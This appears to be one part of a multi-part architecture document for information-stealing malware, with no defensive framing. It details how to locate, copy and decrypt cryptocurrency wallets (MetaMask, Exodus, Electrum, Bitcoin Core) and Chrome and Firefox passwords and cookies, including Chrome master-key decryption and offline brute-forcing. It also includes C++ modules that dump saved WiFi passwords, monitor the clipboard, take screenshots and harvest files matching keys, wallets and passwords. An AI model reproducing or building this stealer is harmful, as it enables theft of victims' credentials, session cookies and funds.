# Data Extraction Techniques

## Document Purpose

This document details the specific extraction techniques for each data source, including file paths, data structures, and extraction methods.

---

## Extraction Overview

```
┌─────────────────────────────────────────────────────────────┐
│                   EXTRACTION TECHNIQUES                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  TECHNIQUE 1: FILE COPY                                     │
│  ───────────────────                                        │
│  Simple file copy from known locations                     │
│  Example: wallet.dat, Exodus wallet files                  │
│                                                             │
│  TECHNIQUE 2: DATABASE EXTRACTION                           │
│  ──────────────────────────                                 │
│  Read SQLite/LevelDB databases                             │
│  Example: Chrome Login Data, MetaMask LevelDB              │
│                                                             │
│  TECHNIQUE 3: MEMORY EXTRACTION                             │
│  ──────────────────────────                                 │
│  Read data from process memory                             │
│  Example: Unencrypted passwords in browser memory          │
│                                                             │
│  TECHNIQUE 4: API QUERY                                     │
│  ──────────────────                                         │
│  Use system APIs to query information                      │
│  Example: System info, network config                      │
│                                                             │
│  TECHNIQUE 5: DECRYPTION                                    │
│  ─────────────────                                          │
│  Decrypt encrypted data using system keys                  │
│  Example: Chrome passwords (DPAPI + AES)                   │
│                                                             │
│  TECHNIQUE 6: SCREENSHOT/CAPTURE                            │
│  ──────────────────────────                                 │
│  Capture screen, clipboard, input                          │
│  Example: Screenshot module, keylogger                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 1. Cryptocurrency Wallets

### MetaMask (Browser Extension)

```
┌─────────────────────────────────────────────────────────────┐
│                    METAMASK EXTRACTION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATIONS                                                  │
│  ─────────                                                  │
│  Windows:                                                   │
│  %APPDATA%\Google\Chrome\User Data\Default\                 │
│  Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgmnn\ │
│                                                             │
│  macOS:                                                     │
│  ~/Library/Application Support/Google/Chrome/Default/       │
│  Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn/ │
│                                                             │
│  Linux:                                                     │
│  ~/.config/google-chrome/Default/                           │
│  Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn/ │
│                                                             │
│  FILES                                                      │
│  ─────                                                      │
│  *.log          - Current LevelDB log                      │
│  *.ldb          - LevelDB data files                       │
│  CURRENT        - LevelDB manifest                         │
│  LOCK           - Database lock file                        │
│  MANIFEST-*     - LevelDB manifest                         │
│                                                             │
│  DATA STRUCTURE                                             │
│  ──────────────                                             │
│  The vault contains an encrypted JSON blob:                │
│  {                                                          │
│    "vault": "encrypted vault data",                        │
│    "crypto": {                                              │
│      "keyring": {                                           │
│        "password": "encrypted password"                    │
│      }                                                      │
│    }                                                        │
│  }                                                          │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. Copy all LevelDB files while browser is closed         │
│  2. If browser is open, copy .log files (current data)     │
│  3. Extract vault from LevelDB key "vault"                 │
│  4. Brute force password offline (if needed)               │
│                                                             │
│  NOTE: The vault is encrypted with user password           │
│        Password can be brute-forced offline                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Exodus Wallet

```
┌─────────────────────────────────────────────────────────────┐
│                    EXODUS EXTRACTION                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATIONS                                                  │
│  ─────────                                                  │
│  Windows: %APPDATA%\Exodus\exodus.wallet\                  │
│  macOS:   ~/Library/Application Support/Exodus/exodus.wallet/
│  Linux:   ~/.config/Exodus/exodus.wallet/                  │
│                                                             │
│  FILES                                                      │
│  ─────                                                      │
│  *.exodus       - Encrypted wallet data                    │
│  *.key          - Encrypted private keys                   │
│  config.json    - Configuration (unencrypted)              │
│                                                             │
│  DATA STRUCTURE                                             │
│  ──────────────                                             │
│  Wallet files are encrypted with AES-256                   │
│  Encryption key derived from user password                 │
│  Salt stored in file header                                │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. Copy all .exodus and .key files                        │
│  2. Copy config.json (may contain hints)                   │
│  3. Brute force password offline                           │
│                                                             │
│  NOTE: Files can be copied while Exodus is running         │
│        but may be incomplete                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Electrum

```
┌─────────────────────────────────────────────────────────────┐
│                    ELECTRUM EXTRACTION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATIONS                                                  │
│  ─────────                                                  │
│  Windows: %APPDATA%\Electrum\wallets\                      │
│  macOS:   ~/.electrum/wallets/                             │
│  Linux:   ~/.electrum/wallets/                             │
│                                                             │
│  FILES                                                      │
│  ─────                                                      │
│  [wallet_name]  - Wallet files (JSON format)               │
│                                                             │
│  DATA STRUCTURE                                             │
│  ──────────────                                             │
│  {                                                          │
│    "keystore": {                                            │
│      "type": "bip32",                                      │
│      "seed": "encrypted seed",                             │
│      "xprv": "encrypted xprv",                             │
│      "derivation": "m/44'/0'/0'/0"                         │
│    },                                                       │
│    "addresses": [...],                                     │
│    "transactions": [...]                                   │
│  }                                                          │
│                                                             │
│  ENCRYPTION                                                 │
│  ──────────                                                 │
│  • Wallet may be encrypted with password                   │
│  • Seed is AES encrypted if password set                   │
│  • Without password, seed is plaintext                     │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. List all files in wallets directory                    │
│  2. Copy each wallet file                                  │
│  3. Check "use_encryption" field                           │
│  4. If encrypted, brute force offline                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Bitcoin Core

```
┌─────────────────────────────────────────────────────────────┐
│                  BITCOIN CORE EXTRACTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATIONS                                                  │
│  ─────────                                                  │
│  Windows: %APPDATA%\Bitcoin\wallet.dat                     │
│  macOS:   ~/Library/Application Support/Bitcoin/wallet.dat │
│  Linux:   ~/.bitcoin/wallet.dat                            │
│                                                             │
│  FILE FORMAT                                                │
│  ───────────                                                │
│  Berkeley DB format (legacy) or SQLite (newer)             │
│  Contains:                                                  │
│  • Private keys (encrypted)                                │
│  • Public keys                                             │
│  • Transactions                                            │
│  • Address book                                            │
│                                                             │
│  ENCRYPTION                                                 │
│  ──────────                                                 │
│  • wallet.dat is encrypted with AES-256                    │
│  • Master key encrypted with user passphrase               │
│  • Requires brute force or password                        │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. Check if bitcoind is running                           │
│  2. If running, copy via RPC: backupwallet                 │
│  3. If not running, copy wallet.dat directly               │
│  4. Use btcrecover or hashcat for brute force              │
│                                                             │
│  RPC METHOD (if bitcoind running):                          │
│  bitcoin-cli backupwallet /path/to/backup.dat              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Browser Data

### Chrome/Chromium Passwords

```
┌─────────────────────────────────────────────────────────────┐
│               CHROME PASSWORD EXTRACTION                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATION                                                   │
│  ────────                                                   │
│  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data │
│                                                             │
│  DATABASE SCHEMA                                            │
│  ──────────────────                                         │
│  Table: logins                                              │
│  Columns:                                                   │
│  • origin_url           TEXT                                │
│  • username_value       TEXT                                │
│  • password_value       BLOB (encrypted)                    │
│  • date_created         INTEGER                             │
│  • blacklisted_by_user  INTEGER                             │
│                                                             │
│  ENCRYPTION SCHEME                                          │
│  ──────────────────                                         │
│  Chrome uses DPAPI (Windows) or keyring (Linux/Mac)        │
│                                                             │
│  Old format (before Chrome 80):                            │
│  ┌────────────────────────────────────────┐                │
│  │ DPAPI(plaintext_password)              │                │
│  └────────────────────────────────────────┘                │
│                                                             │
│  New format (Chrome 80+):                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │ "v10" + IV(12) + AES-GCM(password, master_key)     │    │
│  └────────────────────────────────────────────────────┘    │
│                                                             │
│  MASTER KEY EXTRACTION                                      │
│  ───────────────────                                        │
│  Location: %LOCALAPPDATA%\Google\Chrome\User Data\         │
│            Local State                                      │
│                                                             │
│  JSON path: os_crypt.encrypted_key                         │
│  Format: Base64(DPAPI_prefix + AES_key)                    │
│                                                             │
│  Steps:                                                     │
│  1. Read Local State JSON                                  │
│  2. Extract base64 encoded key                             │
│  3. Decode base64                                          │
│  4. Remove first 5 bytes (DPAPI prefix: "DPAPI")           │
│  5. Decrypt with CryptUnprotectData (Windows)              │
│  6. Result is the master AES-256 key                       │
│                                                             │
│  DECRYPTION FLOW                                            │
│  ─────────────                                              │
│  ┌──────────────┐                                          │
│  │ Login Data   │                                          │
│  │ (SQLite DB)  │                                          │
│  └──────┬───────┘                                          │
│         │                                                   │
│         ▼                                                   │
│  ┌──────────────┐     ┌──────────────┐                     │
│  │ password_    │     │ Master Key   │                     │
│  │ value (blob) │     │ (from Local  │                     │
│  │              │     │  State)      │                     │
│  └──────┬───────┘     └──────┬───────┘                     │
│         │                    │                              │
│         └─────────┬──────────┘                              │
│                   │                                         │
│                   ▼                                         │
│         ┌───────────────────┐                              │
│         │ AES-256-GCM       │                              │
│         │ Decrypt           │                              │
│         └─────────┬─────────┘                              │
│                   │                                         │
│                   ▼                                         │
│         ┌───────────────────┐                              │
│         │ Plaintext         │                              │
│         │ Password          │                              │
│         └───────────────────┘                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Firefox Passwords

```
┌─────────────────────────────────────────────────────────────┐
│               FIREFOX PASSWORD EXTRACTION                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATION                                                   │
│  ────────                                                   │
│  %APPDATA%\Mozilla\Firefox\Profiles\[profile]\             │
│                                                             │
│  FILES                                                      │
│  ─────                                                      │
│  logins.json    - Encrypted login data                     │
│  key4.db        - PKCS#11 database with master key         │
│  cert9.db       - Certificate database                      │
│                                                             │
│  ENCRYPTION SCHEME                                          │
│  ──────────────────                                         │
│  Firefox uses PKCS#11 (NSS) encryption                     │
│  Master password protects the key database                 │
│                                                             │
│  If NO master password:                                    │
│  • key4.db can be read without password                    │
│  • logins.json can be decrypted                            │
│                                                             │
│  If master password set:                                   │
│  • Requires brute force                                    │
│  • Use hashcat with Firefox module                         │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. Copy logins.json                                       │
│  2. Copy key4.db                                           │
│  3. If no master password, decrypt with NSS library        │
│  4. If master password, brute force offline                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Browser Cookies

```
┌─────────────────────────────────────────────────────────────┐
│                   COOKIE EXTRACTION                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LOCATION (Chrome)                                          │
│  ─────────────────                                          │
│  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies    │
│                                                             │
│  DATABASE SCHEMA                                            │
│  ──────────────────                                         │
│  Table: cookies                                             │
│  Columns:                                                   │
│  • host_key           TEXT                                 │
│  • name               TEXT                                 │
│  • value              BLOB (encrypted)                     │
│  • path               TEXT                                 │
│  • expires_utc        INTEGER                              │
│  • is_secure          INTEGER                              │
│  • is_httponly        INTEGER                              │
│                                                             │
│  ENCRYPTION                                                 │
│  ──────────                                                 │
│  Cookie values use same encryption as passwords            │
│  (DPAPI on Windows, keyring on Linux/Mac)                  │
│                                                             │
│  EXTRACTION METHOD                                          │
│  ─────────────────                                          │
│  1. Copy Cookies database                                  │
│  2. Extract master key from Local State                    │
│  3. Decrypt cookie values                                  │
│  4. Export in Netscape format (for import elsewhere)       │
│                                                             │
│  NETSCAPE COOKIE FORMAT                                     │
│  ────────────────────────                                   │
│  # Netscape HTTP Cookie File                               │
│  domain  flag  path  secure  expiration  name  value       │
│                                                             │
│  Example:                                                   │
│  .google.com  TRUE  /  FALSE  1234567890  SID  abc123      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. System Information

### Hardware Fingerprint

```cpp
// Hardware ID generation

std::string generateHWID() {
    std::string components;
    
    // CPU ID (via CPUID instruction)
    components += getCPUID();
    
    // Motherboard serial (via WMI or /sys)
    components += getMotherboardSerial();
    
    // MAC address (first NIC)
    components += getMACAddress();
    
    // Disk serial number
    components += getDiskSerial();
    
    // Hash to create fixed-length HWID
    return sha256(components);
}

// Windows Implementation
std::string getCPUID() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    
    return std::to_string(cpuInfo[0]) + 
           std::to_string(cpuInfo[1]) +
           std::to_string(cpuInfo[2]) +
           std::to_string(cpuInfo[3]);
}

std::string getMotherboardSerial() {
    // WMI query: SELECT * FROM Win32_BaseBoard
    HKEY hKey;
    RegOpenKeyA(HKEY_LOCAL_MACHINE, 
                "HARDWARE\\DESCRIPTION\\System\\BIOS", 
                &hKey);
    
    char serial[256];
    DWORD size = sizeof(serial);
    RegQueryValueExA(hKey, "BaseBoardSerialNumber", 
                     NULL, NULL, (BYTE*)serial, &size);
    
    return std::string(serial);
}

std::string getMACAddress() {
    PIP_ADAPTER_INFO adapterInfo;
    PIP_ADAPTER_INFO adapter;
    
    adapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    GetAdaptersInfo(adapterInfo, &size);
    
    adapter = adapterInfo;
    
    // Return first non-loopback MAC
    char mac[32];
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            adapter->Address[0], adapter->Address[1],
            adapter->Address[2], adapter->Address[3],
            adapter->Address[4], adapter->Address[5]);
    
    return std::string(mac);
}
```

### Network Information

```cpp
// WiFi Networks (Windows)

std::vector<WiFiNetwork> getSavedWiFiNetworks() {
    std::vector<WiFiNetwork> networks;
    
    // Execute: netsh wlan show profiles
    std::string output = execCommand("netsh wlan show profiles");
    
    // Parse profile names
    auto profiles = parseProfileNames(output);
    
    for (const auto& profile : profiles) {
        // Execute: netsh wlan show profile name="X" key=clear
        std::string profileOutput = execCommand(
            "netsh wlan show profile name=\"" + profile + 
            "\" key=clear"
        );
        
        WiFiNetwork network;
        network.ssid = profile;
        network.password = parsePassword(profileOutput);
        network.security = parseSecurity(profileOutput);
        
        networks.push_back(network);
    }
    
    return networks;
}

// Network Configuration
std::map<std::string, std::string> getNetworkConfig() {
    std::map<std::string, std::string> config;
    
    // IP addresses
    config["ip_addresses"] = getIPAddresses();
    
    // Default gateway
    config["gateway"] = getDefaultGateway();
    
    // DNS servers
    config["dns"] = getDNSServers();
    
    return config;
}

std::string getIPAddresses() {
    std::string ips;
    
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    
    // Get local IP
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    struct hostent* host = gethostbyname(hostname);
    
    for (int i = 0; host->h_addr_list[i] != nullptr; ++i) {
        ips += inet_ntoa(*(struct in_addr*)host->h_addr_list[i]);
        ips += ", ";
    }
    
    // Get external IP (via API)
    std::string external = getExternalIP();
    ips += "external: " + external;
    
    return ips;
}
```

---

## 4. Clipboard Monitoring

```cpp
// Clipboard capture

class ClipboardModule : public IModule {
public:
    ClipboardModule();
    
    bool execute() override {
        logInfo("Starting clipboard capture");
        
        // Continuous monitoring loop
        while (m_running) {
            std::string content = getClipboardContent();
            
            if (!content.empty() && content != m_lastContent) {
                // New content detected
                DataBlob blob = createBlob(
                    "clipboard_" + getTimestamp(),
                    "text",
                    std::vector<uint8_t>(content.begin(), content.end())
                );
                
                blob.metadata["captured_at"] = getTimestamp();
                blob.metadata["length"] = std::to_string(content.length());
                
                m_result.blobs.push_back(std::move(blob));
                m_lastContent = content;
            }
            
            // Check every 500ms
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
        
        return true;
    }
    
private:
    std::string getClipboardContent() {
        #ifdef _WIN32
        if (!OpenClipboard(nullptr)) {
            return "";
        }
        
        HANDLE hData = GetClipboardData(CF_TEXT);
        char* data = (char*)GlobalLock(hData);
        
        std::string content(data);
        
        GlobalUnlock(hData);
        CloseClipboard();
        
        return content;
        #endif
    }
};
```

---

## 5. Screenshot Capture

```cpp
// Screenshot capture

class ScreenshotModule : public IModule {
public:
    bool execute() override {
        logInfo("Capturing screenshot");
        
        // Capture screen
        auto screenshot = captureScreen();
        
        if (screenshot.empty()) {
            logError("Failed to capture screenshot");
            return false;
        }
        
        // Encode as PNG
        auto png = encodePNG(screenshot);
        
        // Create blob
        DataBlob blob = createBlob(
            "screenshot_" + getTimestamp(),
            "image",
            png
        );
        
        blob.mimeType = "image/png";
        blob.metadata["resolution"] = getScreenResolution();
        blob.metadata["captured_at"] = getTimestamp();
        
        m_result.blobs.push_back(std::move(blob));
        
        return true;
    }
    
private:
    std::vector<uint8_t> captureScreen() {
        #ifdef _WIN32
        HDC hScreen = GetDC(nullptr);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
        
        // Get bitmap bits
        BITMAPINFO bmi = {};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height;  // Top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        std::vector<uint8_t> bits(width * height * 3);
        GetDIBits(hDC, hBitmap, 0, height, bits.data(), &bmi, DIB_RGB_COLORS);
        
        // Cleanup
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        DeleteObject(hBitmap);
        
        return bits;
        #endif
    }
};
```

---

## 6. File Search

```cpp
// Generic file search for sensitive data

class FileSearchModule : public IModule {
public:
    bool execute() override {
        logInfo("Starting file search");
        
        // Search patterns
        std::vector<std::string> patterns = {
            "*.txt",
            "*.doc",
            "*.docx",
            "*.xls",
            "*.xlsx",
            "*.pdf",
            "*.key",
            "*.pem",
            "*password*",
            "*wallet*",
            "*seed*",
            "*backup*"
        };
        
        // Search directories
        std::vector<std::string> directories = {
            getHomeDirectory(),
            getDesktopPath(),
            getDocumentsPath(),
            getDownloadsPath()
        };
        
        for (const auto& dir : directories) {
            for (const auto& pattern : patterns) {
                searchDirectory(dir, pattern);
            }
        }
        
        return true;
    }
    
private:
    void searchDirectory(const std::string& path, 
                         const std::string& pattern) {
        auto files = glob(path + "/" + pattern);
        
        for (const auto& file : files) {
            // Skip system files
            if (isSystemFile(file)) {
                continue;
            }
            
            // Check file size (skip large files)
            size_t size = getFileSize(file);
            if (size > 10 * 1024 * 1024) {  // 10MB limit
                continue;
            }
            
            // Read file
            auto data = readFile(file);
            
            // Create blob
            DataBlob blob = createBlob(
                "file_" + getFileName(file),
                "file",
                data
            );
            
            blob.metadata["path"] = file;
            blob.metadata["size"] = std::to_string(size);
            
            m_result.blobs.push_back(std::move(blob));
        }
    }
};
```

---

**Document:** 04/06  
**Version:** 1.0  
**Classification:** Technical Architecture
